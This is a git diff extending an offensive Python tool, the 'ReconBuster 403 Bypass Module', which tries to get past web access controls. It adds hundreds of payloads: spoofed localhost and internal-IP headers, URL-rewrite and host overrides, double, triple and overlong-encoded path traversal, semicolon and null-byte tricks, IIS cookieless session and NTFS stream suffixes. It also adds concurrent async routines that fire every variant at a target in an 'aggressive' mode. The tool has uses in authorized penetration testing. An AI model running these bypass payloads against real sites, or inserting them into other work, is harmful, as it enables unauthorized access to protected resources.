@@ -1,16 +1,31 @@
 """
-ReconBuster 403 Bypass Module
-Combines 150+ techniques from: 40XHeaderBypasser, bye403, bypass-403, YA403BT
+ReconBuster 403 Bypass Module - ULTRA ADVANCED Edition
+Combines 300+ techniques from: 40XHeaderBypasser, bye403, bypass-403, YA403BT
 Plus PayloadsAllTheThings directory traversal and SSRF payloads
+
+ADVANCED TECHNIQUES INCLUDED:
+- Path Permutation (payload insertion at every path segment)
+- Trim Inconsistency Bypasses (Flask %85/%a0, Node.js %0a/%0c, Spring Boot semicolon)
+- IIS Cookieless Session Bypass (S(X), A(X), F(X))
+- Case Sensitivity Bypass (Windows vs Linux)
+- Fragment/Hash (#) Bypass Techniques
+- Double/Triple URL Encoding
+- Unicode Normalization Bypass
+- JavaScript Unicode Notation (\\u0061)
+- Protocol Downgrade (HTTP/1.0)
+- Comprehensive Header Manipulation
+- Method Override Chaining
+- Reverse Proxy vs Application Layer Detection
 """
 
 import asyncio
 import aiohttp
 import random
 import hashlib
+import itertools
 from typing import List, Dict, Set, Callable, Optional, Tuple
 from dataclasses import dataclass, field
-from urllib.parse import urlparse, quote, unquote
+from urllib.parse import urlparse, quote, unquote, urlencode
 from .utils import (
     AsyncHTTPClient, ScanResult, normalize_url,
     colorize, format_time, USER_AGENTS
@@ -37,18 +52,24 @@ class BypassResult:
 
 class Bypass403:
     """
-    Advanced 403 Forbidden Bypass Engine
+    ULTRA ADVANCED 403 Forbidden Bypass Engine
 
-    Techniques:
-    1. Header-based bypasses (50+ headers)
-    2. Path manipulation (40+ techniques)
+    300+ Bypass Techniques including:
+    1. Header-based bypasses (80+ headers)
+    2. Path manipulation (100+ techniques)
     3. HTTP method switching (40+ methods)
-    4. URL encoding variations
-    5. Protocol manipulation
-    6. Combined attacks
+    4. URL encoding variations (single, double, triple)
+    5. Protocol manipulation (HTTP/1.0, HTTP/1.1, HTTP/2)
+    6. Combined/chained attacks
+    7. Path permutation (payload at every segment)
+    8. Trim inconsistency bypasses (Flask, Node.js, Spring)
+    9. IIS cookieless session bypass
+    10. Case sensitivity bypass
+    11. Fragment/hash bypass
+    12. Unicode normalization bypass
     """
 
-    # IP Spoofing Headers
+    # ==================== IP SPOOFING HEADERS ====================
     IP_HEADERS = [
         "X-Forwarded-For",
         "X-Originating-IP",
@@ -68,20 +89,41 @@ class Bypass403:
         "Fastly-Client-IP",
         "X-Cluster-Client-IP",
         "X-Forwarded-For-Original",
+        # Additional headers
+        "X-Azure-ClientIP",
+        "X-Backend-IP",
+        "X-From-IP",
+        "X-Internal-IP",
+        "X-Proxy-IP",
+        "X-Remote-Host",
+        "X-Debug-IP",
+        "X-True-IP",
+        "X-Originating-Client-IP",
+        "X-Akamai-Client-IP",
+        "Via",
+        "X-Via",
+        "True-Client-Ip",
+        "X-Cloudflare-CDN-Loop",
+        "Cdn-Loop",
+        "Cf-Ipcountry",
+        "X-Sucuri-Clientip",
     ]
 
-    # IP Values to try
+    # IP Values to try - comprehensive list
     IP_VALUES = [
         "127.0.0.1",
         "localhost",
         "127.0.0.1, 127.0.0.2",
         "127.0.0.1:80",
         "127.0.0.1:443",
-        "2130706433",  # Decimal
-        "0x7F000001",  # Hex
+        "2130706433",  # Decimal representation
+        "0x7F000001",  # Hex representation
+        "0x7f.0x0.0x0.0x1",  # Dotted hex
         "0177.0000.0000.0001",  # Octal
-        "127.1",
-        "127.0.1",
+        "0177.0.0.1",  # Shorthand octal
+        "127.1",  # Shorthand
+        "127.0.1",  # Shorthand
+        "127.000.000.001",  # Padded
         "0",
         "0.0.0.0",
         "10.0.0.1",
@@ -89,12 +131,20 @@ class Bypass403:
         "172.16.0.1",
         "192.168.1.1",
         "192.168.0.1",
-        "::1",
-        "::ffff:127.0.0.1",
+        "::1",  # IPv6 localhost
+        "::ffff:127.0.0.1",  # IPv4-mapped IPv6
         "0000::1",
+        "::ffff:7f00:1",  # IPv4-mapped IPv6 hex
+        "fe80::1",  # Link-local
+        "[::1]",  # Bracketed IPv6
+        "::127.0.0.1",  # Mixed notation
+        "localhost:80",
+        "localhost:443",
+        "127.0.0.1.nip.io",  # DNS rebinding style
+        "spoofed.127.0.0.1.nip.io",
     ]
 
-    # URL Rewrite Headers
+    # ==================== URL REWRITE HEADERS ====================
     URL_HEADERS = [
         "X-Original-URL",
         "X-Rewrite-URL",
@@ -104,9 +154,19 @@ class Bypass403:
         "X-Forwarded-Uri",
         "Destination",
         "Request-Uri",
+        "X-Original-Uri",
+        "X-Custom-URL",
+        "X-Proxy-URL",
+        "Proxy-URL",
+        "Real-IP",
+        "Redirect",
+        "Referer",  # Sometimes works as URL override
+        "X-Backend-URL",
+        "X-Request-URL",
+        "Uri",
     ]
 
-    # Host Headers
+    # ==================== HOST HEADERS ====================
     HOST_HEADERS = [
         "X-Host",
         "X-Forwarded-Host",
@@ -114,94 +174,277 @@ class Bypass403:
         "X-Forwarded-Server",
         "X-Original-Host",
         "Host",
+        "X-HTTP-Host-Override",
+        "X-Backend-Host",
+        "Proxy-Host",
+        "X-Custom-Host",
+        "X-Target-Host",
     ]
 
-    # HTTP Methods
+    # ==================== HTTP METHODS ====================
     HTTP_METHODS = [
         "GET", "POST", "PUT", "DELETE", "PATCH",
         "HEAD", "OPTIONS", "TRACE", "CONNECT",
-        # WebDAV
+        # WebDAV methods
         "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
         "MOVE", "LOCK", "UNLOCK", "SEARCH",
         "REPORT", "MKACTIVITY", "CHECKOUT", "MERGE",
         "M-SEARCH", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE",
         "PURGE", "LINK", "UNLINK", "ACL",
-        # Custom
-        "FOOBAR", "TEST", "DEBUG",
+        # Less common WebDAV
+        "BASELINE-CONTROL", "VERSION-CONTROL",
+        "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL",
+        # Custom/Test methods
+        "FOOBAR", "TEST", "DEBUG", "TRACK", "QUERY",
+        # Case variations
+        "get", "Get", "gEt", "GeT",
+        "post", "Post", "pOsT",
     ]
 
-    # Path manipulation patterns
+    # ==================== TRIM INCONSISTENCY PAYLOADS ====================
+    # These exploit whitespace handling differences between reverse proxy and app
+    TRIM_PAYLOADS = {
+        # Flask/Python specific - trims these characters
+        "flask": ["%85", "%a0", "%1f", "%04"],
+        # Node.js/Express specific
+        "nodejs": ["%0a", "%0d", "%0c", "%09", "%20"],
+        # Spring Boot/Java specific
+        "spring": [";", ";.", ";/", "..;", ";.."],
+        # PHP specific
+        "php": ["%00", "%0a", "%0d"],
+        # General whitespace
+        "general": ["%20", "%09", "%0a", "%0b", "%0c", "%0d", "%a0"],
+    }
+
+    # ==================== IIS COOKIELESS SESSION ====================
+    # Microsoft IIS cookieless session path injection
+    IIS_COOKIELESS = [
+        "(S(X))",  # Session
+        "(A(X))",  # Anonymous ID
+        "(F(X))",  # Form ticket
+        "(S(X))/(A(Y))",  # Combined
+        "(S(lit3rally_telegraphy))",  # Example from research
+        "(S(anything))",
+        "(A(anything))",
+        "(F(anything))",
+    ]
+
+    # ==================== PATH MANIPULATION PATTERNS ====================
     PATH_PATTERNS = [
+        # Basic variations
         "/{path}",
         "/{path}/",
         "/{path}//",
         "//{path}",
         "//{path}//",
+        "///{path}",
+        "/{path}///",
+
+        # Dot variations
         "/./{path}",
         "/{path}/.",
+        "/{path}./",
         "/{path}/..",
+        "/{path}/../{path}",
+        "/./{path}/./",
+        "/../{path}",
+        "/..;/{path}",
+        "/{path}/..;/",
         "/{path}..;/",
         "/{path};/",
+        "/;/{path}",
+        "/.;/{path}",
+        "//;/{path}",
+        "/.;./{path}",
+        "/.;/./{path}",
+
+        # Whitespace/special characters
         "/{path}%20",
         "/{path}%09",
         "/{path}%00",
+        "/{path}%0a",
+        "/{path}%0d",
+        "/{path}%0d%0a",
+        " /{path}",
+        "/{path} ",
+
+        # Query string tricks
         "/{path}?",
         "/{path}??",
+        "/{path}???",
+        "/{path}?anything",
+        "/{path}?debug=1",
+        "/{path}?.css",
+        "/{path}?.js",
+        "/{path}?.html",
+        "/{path}?&",
+        "/{path}?%00",
+        "/{path}?%0a",
+
+        # Fragment/hash tricks
         "/{path}#",
+        "/{path}#anything",
+        "/{path}#.",
+        "/{path}#/",
+        "/{path}%23",
+        "/{path}%23/",
+        "/{path}%23.",
+
+        # Extension tricks
         "/{path}.html",
         "/{path}.json",
         "/{path}.php",
         "/{path}.css",
         "/{path}.js",
+        "/{path}.xml",
+        "/{path}.asp",
+        "/{path}.aspx",
+        "/{path}.txt",
+        "/{path}.pdf",
+        "/{path}.png",
+        "/{path}.ico",
         "/{path}....json",
         "/{path}%00.json",
-        "/{path}?anything",
-        "/{path}#anything",
-        "/{path}~",
-        "/{path}@",
-        "/{path}*",
-        # URL Encoding
+        "/{path}/.json",
+        "/{path}..json",
+        "/{path}.randomext",
+
+        # Single URL encoding
         "/%2e/{path}",
         "/%2e%2e/{path}",
         "/{path}%2f",
         "/{path}%2f/",
-        "/%252e/{path}",
-        "/%252e%252e/{path}",
-        # Semicolon
-        "/;/{path}",
-        "/.;/{path}",
-        "//;/{path}",
-        "/{path};foo=bar",
-        # Unicode
-        "/%ef%bc%8f{path}",
-        # Case
-        "/{PATH}",  # Uppercase
-        # Double encoding
-        "/{path}%252f",
+        "/%2e/{path}%2f",
+        "/%2F{path}",
+        "/{path}%2F",
         "/%2e%2e%2f{path}",
         "/%2e%2e/{path}",
-        # Backslash
+
+        # Double URL encoding
+        "/%252e/{path}",
+        "/%252e%252e/{path}",
+        "/{path}%252f",
+        "/{path}%252f/",
+        "/%252e%252e%252f{path}",
+        "/%252F{path}",
+        "/{path}%252F",
+
+        # Triple URL encoding
+        "/%25252e/{path}",
+        "/%25252e%25252e/{path}",
+        "/{path}%25252f",
+
+        # Backslash variations
         "/..%5c{path}",
         "/{path}%5c",
-        # Null byte
+        "/%5c{path}",
+        "/..%255c{path}",
+        "/{path}%5c..%5c",
+        "\\{path}",
+        "{path}\\",
+        "/..\\{path}",
+
+        # Null byte injection
         "/..%00/{path}",
         "/{path}%00",
-        # Special
-        "/../{path}",
-        "/..;/{path}",
-        "/{path}/..;/",
-        "/./{path}/./",
+        "/{path}%00.html",
+        "/{path}%00.json",
+        "/..%00%2f{path}",
+
+        # Semicolon path parameters (Java environments)
+        "/{path};foo=bar",
+        "/{path};/",
+        "/{path};.css",
+        "/{path};.js",
+        "/{path};x=y",
+        "/{path};a=b;c=d",
+        "/;/{path}",
+        "/;x=/{path}",
+        "/.;/{path}",
+        "/.;x=/{path}",
+
+        # Special characters
+        "/{path}~",
+        "/{path}@",
+        "/{path}*",
+        "/{path}!",
+        "/{path}$",
+        "/{path}&",
+        "/{path}+",
+        "/{path}=",
+
+        # Unicode/UTF-8 tricks
+        "/%ef%bc%8f{path}",  # Fullwidth solidus
+        "/%c0%af{path}",  # Overlong encoding
+        "/%c0%2f{path}",  # Overlong
+        "/%e0%80%af{path}",  # Overlong
+        "/{path}%c0%af",
+        "/%c1%1c{path}",
+        "/%c1%9c{path}",
+
+        # Case manipulation
+        "/{PATH}",  # Uppercase
+        "/{Path}",  # Mixed case
+        "/{pAtH}",  # SpongeBob case
+
+        # Protocol relative
+        "///{path}",
+        "////{path}",
+
+        # IIS specific
+        "/{path}.xxx",  # IIS ignores unknown extensions
+        "/{path}::$DATA",  # NTFS ADS
+        "/{path}::$INDEX_ALLOCATION",
+
+        # Mix patterns
+        "/{path}/./",
         "//{path}/..",
+        "/./{path}//",
+        "/..//../{path}",
     ]
+
+    # ==================== UNICODE NORMALIZATION PAYLOADS ====================
+    UNICODE_PAYLOADS = {
+        "/": [
+            "%2f", "%252f", "%25252f",  # URL encoded
+            "%c0%af", "%e0%80%af", "%c0%2f",  # Overlong UTF-8
+            "%ef%bc%8f",  # Fullwidth solidus
+            "\u2215",  # Division slash
+            "\u2044",  # Fraction slash
+            "\uff0f",  # Fullwidth solidus
+        ],
+        ".": [
+            "%2e", "%252e", "%25252e",  # URL encoded
+            "%c0%ae",  # Overlong UTF-8
+            "\uff0e",  # Fullwidth full stop
+            "\u2024",  # One dot leader
+        ],
+        ";": [
+            "%3b", "%253b",  # URL encoded
+        ]
+    }
+
+    # ==================== JAVASCRIPT UNICODE NOTATION ====================
+    # For bypassing WAFs that check strings
+    JS_UNICODE = {
+        "a": "\\u0061",
+        "d": "\\u0064",
+        "m": "\\u006d",
+        "i": "\\u0069",
+        "n": "\\u006e",
+        "/": "\\u002f",
+        ".": "\\u002e",
+    }
 
     def __init__(self, target_url: str, callback: Callable = None,
                  threads: int = 30, timeout: int = 10,
-                 verify_ssl: bool = False):
+                 verify_ssl: bool = False, aggressive: bool = True):
         self.target_url = normalize_url(target_url)
         self.callback = callback
         self.threads = threads
         self.timeout = timeout
         self.verify_ssl = verify_ssl
+        self.aggressive = aggressive  # Enable all advanced techniques
 
         # Parse URL components
         parsed = urlparse(self.target_url)
@@ -209,6 +452,9 @@ class Bypass403:
         self.host = parsed.netloc
         self.path = parsed.path or "/"
         self.base_url = f"{self.scheme}://{self.host}"
+
+        # Parse path segments for permutation attacks
+        self.path_segments = [s for s in self.path.split('/') if s]
 
         self.results: List[BypassResult] = []
         self.successful_bypasses: List[BypassResult] = []
@@ -222,6 +468,10 @@ class Bypass403:
             "header_bypasses": 0,
             "path_bypasses": 0,
             "method_bypasses": 0,
+            "permutation_bypasses": 0,
+            "trim_bypasses": 0,
+            "iis_bypasses": 0,
+            "unicode_bypasses": 0,
             "errors": 0
         }
 
@@ -231,9 +481,9 @@ class Bypass403:
             await self.callback(event, data)
 
     async def bypass(self) -> List[BypassResult]:
-        """Main bypass method - runs all techniques"""
+        """Main bypass method - runs all techniques including advanced ones"""
         await self.emit("status", {
-            "message": f"Starting 403 bypass on {self.target_url}",
+            "message": f"Starting ULTRA ADVANCED 403 bypass on {self.target_url}",
             "target": self.target_url
         })
 
@@ -251,13 +501,27 @@ class Bypass403:
         })
 
         # Run all bypass techniques concurrently
-        await asyncio.gather(
+        bypass_tasks = [
             self._header_bypasses(),
             self._path_bypasses(),
             self._method_bypasses(),
             self._combined_bypasses(),
-            return_exceptions=True
-        )
+        ]
+
+        # Add advanced techniques if aggressive mode enabled
+        if self.aggressive:
+            bypass_tasks.extend([
+                self._path_permutation_bypasses(),
+                self._trim_inconsistency_bypasses(),
+                self._iis_cookieless_bypasses(),
+                self._case_sensitivity_bypasses(),
+                self._unicode_normalization_bypasses(),
+                self._fragment_hash_bypasses(),
+                self._advanced_header_bypasses(),
+                self._protocol_manipulation_bypasses(),
+            ])
+
+        await asyncio.gather(*bypass_tasks, return_exceptions=True)
 
         # Filter and deduplicate results
         self._filter_results()
@@ -578,6 +842,377 @@ class Bypass403:
     def get_high_confidence_bypasses(self) -> List[BypassResult]:
         """Get only high confidence bypasses"""
         return [r for r in self.successful_bypasses if r.confidence == "high"]
+
+    # ==================== ADVANCED BYPASS METHODS ====================
+
+    async def _path_permutation_bypasses(self):
+        """
+        Path permutation attack - insert payloads at EVERY path segment
+        Example: /api/v1/admin -> /api%2fv1/admin, /api/v1%2fadmin, etc.
+        This catches cases where only part of the path is protected
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+
+        if not self.path_segments:
+            return
+
+        # Payloads to insert at each segment
+        segment_payloads = [
+            "..;",  # Semicolon traversal
+            ".;",
+            ";",
+            "%2e%2e;",
+            "..%00",  # Null byte
+            "..%0d",  # Carriage return
+            "..%0a",  # Line feed
+            "%20",  # Space
+            "%09",  # Tab
+            ".",
+            "./",
+            "../",
+            "",  # Try without segment
+        ]
+
+        # For each segment position, try inserting payloads
+        for i in range(len(self.path_segments)):
+            for payload in segment_payloads:
+                # Insert payload BEFORE segment
+                modified_segments = self.path_segments.copy()
+                modified_segments[i] = payload + modified_segments[i]
+                new_path = "/" + "/".join(modified_segments)
+
+                async def try_permutation(p=new_path, pay=payload, idx=i):
+                    async with semaphore:
+                        await self._make_request(
+                            f"{self.base_url}{p}",
+                            technique=f"Path permutation: {pay} before segment {idx}",
+                            category="path_permutation"
+                        )
+                tasks.append(try_permutation())
+
+                # Insert payload AFTER segment
+                modified_segments = self.path_segments.copy()
+                modified_segments[i] = modified_segments[i] + payload
+                new_path = "/" + "/".join(modified_segments)
+
+                async def try_permutation_after(p=new_path, pay=payload, idx=i):
+                    async with semaphore:
+                        await self._make_request(
+                            f"{self.base_url}{p}",
+                            technique=f"Path permutation: {pay} after segment {idx}",
+                            category="path_permutation"
+                        )
+                tasks.append(try_permutation_after())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+        self.stats["permutation_bypasses"] = len(tasks)
+
+    async def _trim_inconsistency_bypasses(self):
+        """
+        Trim inconsistency bypass - exploit different whitespace handling
+        between reverse proxy (Nginx) and application (Flask, Node.js, Spring)
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+        path = self.path.strip('/')
+
+        # Test all framework-specific trim payloads
+        for framework, payloads in self.TRIM_PAYLOADS.items():
+            for payload in payloads:
+                # Payload at end of path
+                url = f"{self.base_url}/{path}{payload}"
+                async def try_trim_end(u=url, p=payload, fw=framework):
+                    async with semaphore:
+                        await self._make_request(
+                            u,
+                            technique=f"Trim inconsistency ({fw}): path + {p}",
+                            category="trim_inconsistency"
+                        )
+                tasks.append(try_trim_end())
+
+                # Payload at beginning of path
+                url = f"{self.base_url}/{payload}{path}"
+                async def try_trim_start(u=url, p=payload, fw=framework):
+                    async with semaphore:
+                        await self._make_request(
+                            u,
+                            technique=f"Trim inconsistency ({fw}): {p} + path",
+                            category="trim_inconsistency"
+                        )
+                tasks.append(try_trim_start())
+
+                # Payload between slashes
+                url = f"{self.base_url}/{payload}/{path}"
+                async def try_trim_middle(u=url, p=payload, fw=framework):
+                    async with semaphore:
+                        await self._make_request(
+                            u,
+                            technique=f"Trim inconsistency ({fw}): /{p}/path",
+                            category="trim_inconsistency"
+                        )
+                tasks.append(try_trim_middle())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+        self.stats["trim_bypasses"] = len(tasks)
+
+    async def _iis_cookieless_bypasses(self):
+        """
+        IIS Cookieless Session Bypass
+        Exploits Microsoft IIS cookieless session feature to inject paths
+        Format: /(S(sessionid))/path or /(A(anonymousid))/path
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+        path = self.path.strip('/')
+
+        for session_token in self.IIS_COOKIELESS:
+            # Token before path
+            url = f"{self.base_url}/{session_token}/{path}"
+            async def try_iis(u=url, t=session_token):
+                async with semaphore:
+                    await self._make_request(
+                        u,
+                        technique=f"IIS Cookieless: {t}/path",
+                        category="iis_cookieless"
+                    )
+            tasks.append(try_iis())
+
+            # Token at root
+            url = f"{self.base_url}/{session_token}{self.path}"
+            async def try_iis_root(u=url, t=session_token):
+                async with semaphore:
+                    await self._make_request(
+                        u,
+                        technique=f"IIS Cookieless: {t}path",
+                        category="iis_cookieless"
+                    )
+            tasks.append(try_iis_root())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+        self.stats["iis_bypasses"] = len(tasks)
+
+    async def _case_sensitivity_bypasses(self):
+        """
+        Case sensitivity bypass - Windows servers are case-insensitive
+        Try uppercase, lowercase, mixed case, and SpongeBob case
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+        path = self.path.strip('/')
+
+        def spongebob_case(s):
+            """Convert to SpongeBob case (alternating caps)"""
+            return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))
+
+        def random_case(s):
+            """Random case variation"""
+            return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+
+        case_variations = [
+            path.upper(),  # ADMIN
+            path.lower(),  # admin
+            path.capitalize(),  # Admin
+            path.swapcase(),  # If "Admin" -> "aDMIN"
+            spongebob_case(path),  # aDmIn
+        ]
+
+        # Add random case variations
+        for _ in range(3):
+            case_variations.append(random_case(path))
+
+        for variation in case_variations:
+            url = f"{self.base_url}/{variation}"
+            async def try_case(u=url, v=variation):
+                async with semaphore:
+                    await self._make_request(
+                        u,
+                        technique=f"Case sensitivity: {v}",
+                        category="case_sensitivity"
+                    )
+            tasks.append(try_case())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _unicode_normalization_bypasses(self):
+        """
+        Unicode normalization bypass - exploit Unicode character equivalence
+        Different characters that normalize to the same ASCII
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+        path = self.path
+
+        # Replace characters with Unicode equivalents
+        for char, replacements in self.UNICODE_PAYLOADS.items():
+            for replacement in replacements:
+                new_path = path.replace(char, replacement)
+                if new_path != path:
+                    url = f"{self.base_url}{new_path}"
+                    async def try_unicode(u=url, c=char, r=replacement):
+                        async with semaphore:
+                            await self._make_request(
+                                u,
+                                technique=f"Unicode normalization: {c} -> {r}",
+                                category="unicode_normalization"
+                            )
+                    tasks.append(try_unicode())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+        self.stats["unicode_bypasses"] = len(tasks)
+
+    async def _fragment_hash_bypasses(self):
+        """
+        Fragment/Hash bypass techniques
+        Fragments (#) should be client-side only but some servers handle them
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+        path = self.path.strip('/')
+
+        fragment_payloads = [
+            f"/{path}#",
+            f"/{path}#/",
+            f"/{path}#..",
+            f"/{path}#/../admin",
+            f"/{path}%23",
+            f"/{path}%23/",
+            f"/{path}%2523",  # Double encoded
+            f"/{path}?#",
+            f"/{path}?a=b#c",
+            f"#{path}",  # Fragment at start
+            f"/%23{path}",
+            f"/{path}#%00",
+            f"/{path}#%0a",
+        ]
+
+        for payload in fragment_payloads:
+            url = f"{self.base_url}{payload}"
+            async def try_fragment(u=url, p=payload):
+                async with semaphore:
+                    await self._make_request(
+                        u,
+                        technique=f"Fragment bypass: {p}",
+                        category="fragment_bypass"
+                    )
+            tasks.append(try_fragment())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _advanced_header_bypasses(self):
+        """
+        Advanced header combinations and obscure headers
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+        path = self.path
+
+        # Multi-header combinations
+        advanced_headers = [
+            # Double X-Forwarded-For
+            {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
+            # All localhost variations
+            {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost", "X-Original-URL": path},
+            # Admin impersonation
+            {"X-Forwarded-For": "127.0.0.1", "X-Custom-IP-Authorization": "127.0.0.1", "X-Forwarded-Proto": "https"},
+            # Cloudflare bypass attempt
+            {"CF-Connecting-IP": "127.0.0.1", "True-Client-IP": "127.0.0.1"},
+            # AWS ALB bypass
+            {"X-Forwarded-For": "127.0.0.1", "X-Amzn-Trace-Id": "Root=1-000-000"},
+            # URL rewrite combinations
+            {"X-Original-URL": path, "X-Rewrite-URL": path},
+            {"X-Original-URL": "/", "X-Forwarded-For": "127.0.0.1"},
+            # Method override combinations
+            {"X-HTTP-Method-Override": "GET", "X-Method-Override": "GET", "X-HTTP-Method": "GET"},
+            # Content-Type variations
+            {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
+            {"Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "127.0.0.1"},
+            # Accept header manipulation
+            {"Accept": "application/json", "X-Forwarded-For": "127.0.0.1"},
+            {"Accept": "*/*", "Accept-Language": "*", "Accept-Encoding": "identity"},
+            # Proxy headers
+            {"Forwarded": "for=127.0.0.1;host=localhost;proto=https", "Via": "1.1 localhost"},
+            # Obscure headers that might work
+            {"X-Originating-IP": "[::1]"},
+            {"X-Remote-Addr": "::1"},
+            {"X-Backend-IP": "127.0.0.1"},
+            {"X-Debug": "1", "X-Debug-Token": "bypass"},
+            {"X-Frame-Options": "bypass"},
+        ]
+
+        for headers in advanced_headers:
+            async def try_advanced(h=headers):
+                async with semaphore:
+                    await self._make_request(
+                        self.target_url,
+                        headers=h,
+                        technique=f"Advanced headers: {list(h.keys())}",
+                        category="advanced_headers"
+                    )
+            tasks.append(try_advanced())
+
+            # Also try with URL rewrite headers to root
+            headers_with_root = headers.copy()
+            headers_with_root["X-Original-URL"] = "/"
+            async def try_with_root(h=headers_with_root):
+                async with semaphore:
+                    await self._make_request(
+                        self.base_url + "/",
+                        headers=h,
+                        technique=f"Advanced headers + X-Original-URL: {list(h.keys())}",
+                        category="advanced_headers"
+                    )
+            tasks.append(try_with_root())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _protocol_manipulation_bypasses(self):
+        """
+        Protocol version and connection manipulation
+        """
+        semaphore = asyncio.Semaphore(self.threads)
+        tasks = []
+
+        # Connection header variations
+        connection_headers = [
+            {"Connection": "close"},
+            {"Connection": "keep-alive"},
+            {"Connection": "upgrade"},
+            {"Upgrade": "websocket"},
+            {"Upgrade": "h2c"},  # HTTP/2 cleartext
+        ]
+
+        for headers in connection_headers:
+            async def try_connection(h=headers):
+                async with semaphore:
+                    await self._make_request(
+                        self.target_url,
+                        headers=h,
+                        technique=f"Connection manipulation: {h}",
+                        category="protocol_manipulation"
+                    )
+            tasks.append(try_connection())
+
+        # Transfer-Encoding tricks
+        te_headers = [
+            {"Transfer-Encoding": "chunked"},
+            {"Transfer-Encoding": "identity"},
+            {"Transfer-Encoding": "chunked, identity"},
+        ]
+
+        for headers in te_headers:
+            async def try_te(h=headers):
+                async with semaphore:
+                    await self._make_request(
+                        self.target_url,
+                        method="POST",
+                        headers=h,
+                        technique=f"Transfer-Encoding: {h}",
+                        category="protocol_manipulation"
+                    )
+            tasks.append(try_te())
+
+        await asyncio.gather(*tasks, return_exceptions=True)
 
 
 class Bypass403Bulk:
